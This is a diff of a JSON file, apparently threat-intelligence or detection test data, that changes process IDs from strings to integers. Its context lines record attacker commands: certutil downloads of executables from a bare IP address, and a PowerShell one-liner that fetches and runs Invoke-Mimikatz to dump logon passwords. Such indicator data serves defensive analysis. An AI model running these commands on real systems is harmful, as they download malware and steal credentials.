@@ -71,7 +71,7 @@
                     "binary_ref": "7",
                     "command_line": "certutil -urlcache -split -f http://67.229.97.229/c64.exe c64.exe",
                     "cwd": "C:\\Windows\\system32\\",
-                    "pid": "744"
+                    "pid": 744
                 },
                 "10": {
                     "type": "directory",
@@ -163,7 +163,7 @@
                     "binary_ref": "7",
                     "command_line": "certutil -urlcache -split -f http://67.229.97.229/F64.data F64.data",
                     "cwd": "C:\\Windows\\system32\\",
-                    "pid": "744"
+                    "pid": 744
                 },
                 "10": {
                     "type": "directory",
@@ -255,7 +255,7 @@
                     "binary_ref": "7",
                     "command_line": "powershell \"IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command privilege::debug sekurlsa::logonpasswords exit\"",
                     "cwd": "C:\\Windows\\system32\\",
-                    "pid": "2252"
+                    "pid": 2252
                 },
                 "10": {
                     "type": "directory",
@@ -343,7 +343,7 @@
                     "binary_ref": "6",
                     "command_line": "certutil -urlcache -split -f http://67.229.97.229/c64.exe c64.exe",
                     "cwd": "C:\\Windows\\system32\\",
-                    "pid": "744"
+                    "pid": 744
                 },
                 "9": {
                     "type": "directory",
@@ -431,7 +431,7 @@
                     "binary_ref": "6",
                     "command_line": "certutil -urlcache -split -f http://67.229.97.229/F64.data F64.data",
                     "cwd": "C:\\Windows\\system32\\",
-                    "pid": "744"
+                    "pid": 744
                 },
                 "9": {
                     "type": "directory",
@@ -519,7 +519,7 @@
                     "binary_ref": "6",
                     "command_line": "powershell \"IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command privilege::debug sekurlsa::logonpasswords exit\"",
                     "cwd": "C:\\Windows\\system32\\",
-                    "pid": "2252"
+                    "pid": 2252
                 },
                 "9": {
                     "type": "directory",
